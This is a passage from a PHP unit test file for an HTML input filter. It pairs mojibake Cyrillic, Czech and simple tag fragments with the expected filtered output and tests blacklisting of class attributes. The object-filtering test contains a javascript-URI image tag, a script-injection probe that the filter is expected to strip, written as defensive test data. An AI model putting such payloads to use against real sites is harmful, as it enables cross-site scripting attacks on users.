				'<li><strong>Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°</strong>. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°-Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð° Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ñ‘Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°, Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°-Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</li>
</ol>
<p>Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ñ‘Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°: Ð°Ð°Ð°Ð°Ð°Ð°.Ð°Ð°Ð°Ð°Ð°Ð°, Qiwi, Webmoney Ð° Ð°.Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</p>
<p>{lang ru} <iframe src="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" width="100%" height="439" allowfullscreen="allowfullscreen"></iframe> {/lang}
<script type="application/ld+json">{
  "@context": "http://schema.org",
  "@type": "VideoObject",
  "name": "Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°",
  "description": "Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ñ‘Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°.",
  "thumbnailUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "uploadDate": "2015-02-16T12:15:30+12:15",
  "duration": "PT10M51S",
  "embedUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}</script>
</p>',
				'From generic cases'
			),
			'tracker15673e'       => array(
				'raw',
				'<li><strong>Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°</strong>. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°-Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð° Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ñ‘Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°, Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°-Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</li>
</ol>
<p>Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ñ‘Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°: Ð°Ð°Ð°Ð°Ð°Ð°.Ð°Ð°Ð°Ð°Ð°Ð°, Qiwi, Webmoney Ð° Ð°.Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</p>
<p>{lang ru} <iframe src="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" width="100%" height="439" allowfullscreen="allowfullscreen"></iframe> {/lang}
<script type="application/ld+json">{
  "@context": "http://schema.org",
  "@type": "VideoObject",
  "name": "Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°",
  "description": "Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ñ‘Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°.",
  "thumbnailUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "uploadDate": "2015-02-16T12:15:30+12:15",
  "duration": "PT10M51S",
  "embedUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}</script>
</p>',
				'<li><strong>Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°</strong>. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°-Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð° Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð°Ð°Ð°Ñ‘Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°, Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°-Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°, Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° â€“ Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</li>
</ol>
<p>Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ñ‘Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°: Ð°Ð°Ð°Ð°Ð°Ð°.Ð°Ð°Ð°Ð°Ð°Ð°, Qiwi, Webmoney Ð° Ð°.Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð° Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°, Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°.</p>
<p>{lang ru} <iframe src="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" width="100%" height="439" allowfullscreen="allowfullscreen"></iframe> {/lang}
<script type="application/ld+json">{
  "@context": "http://schema.org",
  "@type": "VideoObject",
  "name": "Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°",
  "description": "Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ñ‘Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°. Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°Ð°Ð° Ð°Ð°Ð°Ð°Ð°Ð°.",
  "thumbnailUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "uploadDate": "2015-02-16T12:15:30+12:15",
  "duration": "PT10M51S",
  "embedUrl": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
}</script>
</p>',
				'From generic cases'
			),
			'tracker15673f'       => array(
				'raw',
				'<a rel="new" href="#"></a>',
				'<a rel="new" href="#"></a>',
				'From generic cases'
			),
			'tracker15673g'       => array(
				'string',
				'<a rel="new" href="#"></a>',
				'<a rel="new" href="#"></a>',
				'From generic cases'
			),
			'tracker15673h'       => array(
				'raw',
				'<hr id="system-readmore" />',
				'<hr id="system-readmore" />',
				'From generic cases'
			),
			'tracker15673i'       => array(
				'string',
				'<hr id="system-readmore" />',
				'<hr id="system-readmore" />',
				'From generic cases'
			),
			'tracker15673j'       => array(
				'string',
				'<p style="text-align: justify;"><strong>Nafta nebo baterie? Za nás jednoznačně to druhé. Před pár dny jsme si vyzvedli nový elektromobil. Nyní jej testujeme a zatím můžeme říct jedno - pozor, toto vozítko je vysoce návykové!</strong></p>',
				'<p style="text-align: justify;"><strong>Nafta nebo baterie? Za nás jednoznačně to druhé. Před pár dny jsme si vyzvedli nový elektromobil. Nyní jej testujeme a zatím můžeme říct jedno - pozor, toto vozítko je vysoce návykové!</strong></p>',
				'From generic cases'
			),
			'tracker15673k'       => array(
				'string',
				'<p style="text-align: justify;"><a href="http://www.example.com" target="_blank" rel="noopener noreferrer">Auta.</a> </p>',
				'<p style="text-align: justify;"><a href="http://www.example.com" target="_blank" rel="noopener noreferrer">Auta.</a> </p>',
				'From generic cases'
			),
			'Attribute with dash' => array(
				'string',
				'<img data-value="1" />',
				'<img data-value="1" />',
				'From generic cases'
			),
		);
		$tests         = array_merge($this->casesGeneric(), $casesSpecific);

		return $tests;
	}

	/**
	 * Execute a test case with clean() using custom class blacklist filter settings (strips bad tags).
	 *
	 * @param   string  $type     The type of input
	 * @param   string  $data     The input
	 * @param   string  $expect   The expected result for this test.
	 * @param   string  $message  The failure message identifying the source of the test case.
	 *
	 * @return  void
	 *
	 * @dataProvider blacklistClass
	 */
	public function testCleanWithClassBlackList($type, $data, $expect, $message)
	{
		$filter = new InputFilter(null, array('class'), 1, 1);
		$this->assertThat(
			$filter->clean($data, $type),
			$this->equalTo($expect),
			$message
		);
	}

	/**
	 * Test object filtering
	 */
	public function testCleanObject()
	{
		$rawInput   = '<img src="javascript:alert();" />';
		$cleanInput = '';

		$object   = new ArbitraryObject($rawInput, $rawInput, $rawInput);
		$expected = new ArbitraryObject($cleanInput, $rawInput, $rawInput);

		$filter = new InputFilter();

		$this->assertEquals($expected, $filter->clean($object));
	}
}
